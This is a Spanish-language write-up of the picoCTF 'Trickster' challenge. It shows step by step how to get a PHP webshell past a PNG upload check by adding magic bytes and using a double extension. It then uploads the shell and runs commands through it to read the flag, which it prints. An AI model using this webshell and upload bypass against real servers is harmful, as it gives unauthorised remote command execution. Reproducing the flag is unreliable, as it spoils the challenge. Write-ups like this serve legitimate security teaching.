# Trickster

## Descripción

Aplicación web que valida y procesa imágenes PNG. El reto consiste en uploadear un archivo que pase la validación (extensión .png + magic bytes PNG) pero que sea ejecutable como PHP. El objetivo es obtener un webshell para ejecutar comandos y extraer la bandera.

URL del reto: `http://atlas.picoctf.net:52540`

## Solución

### Paso 1: Entender la validación

El servidor valida dos cosas:
1. El nombre debe contener `.png` (no necesariamente al final)
2. El archivo debe comenzar con magic bytes PNG: `89 50 4E 47 0D 0A 1A 0A`

Los archivos se guardan en `/uploads/`

### Paso 2: Crear webshell con magic bytes PNG + PHP

La clave es crear un archivo que comience con los magic bytes PNG pero contenga código PHP ejecutable. El nombre debe tener `.png` pero puede terminar en `.php`:

```bash
python3 << 'PYEOF'
# Magic bytes PNG: 89 50 4E 47 0D 0A 1A 0A
png_magic = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])

# PHP code: <?php system($_GET[0]); ?>
php_code = b'<?php system($_GET[0]); ?>'

# Create shell.png.php
with open('shell.png.php', 'wb') as f:
    f.write(png_magic)
    f.write(php_code)

print("Webshell created: shell.png.php")
PYEOF
```

### Paso 3: Verificar magic bytes

```bash
xxd -l 16 shell.png.php
```

Debe mostrar: `89 50 4e 47 0d 0a 1a 0a 3c 3f 70 68 70...`

### Paso 4: Subir el archivo

```bash
curl -s -F "file=@shell.png.php" http://atlas.picoctf.net:52540
```

Respuesta esperada: `File uploaded successfully and is a valid PNG file.`

### Paso 5: Ejecutar comandos

Una vez uploadado en `/uploads/shell.png.php`, ejecuta comandos usando el parámetro `0`:

```bash
# Listar directorio padre
curl -s "http://atlas.picoctf.net:52540/uploads/shell.png.php?0=ls%20.."

# Leer archivo de bandera
curl -s "http://atlas.picoctf.net:52540/uploads/shell.png.php?0=cat%20../FLAGNAME.txt" | strings | tail -1
```

## Notas

El servidor:
- Valida extensión `.png` en el nombre (puede ser `shell.png.php`)
- Valida magic bytes al inicio (ignora lo que viene después)
- Apache ejecuta el archivo como PHP porque termina en `.php`

Aunque el archivo comienza con bytes inválidos como PHP, la respuesta incluye los magic bytes PNG seguidos de la ejecución del PHP. Usar `strings` para filtrar el output.

Bandera obtenida: `picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}`

## Referencias

- OWASP - File Upload Vulnerabilities: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- PHP Magic Bytes Bypass: https://brandon-t-elliott.github.io/trickster
- PNG Magic Bytes: https://en.wikipedia.org/wiki/List_of_file_signatures
- Apache File Type Configuration: https://httpd.apache.org/docs/current/mod/mod_mime.html
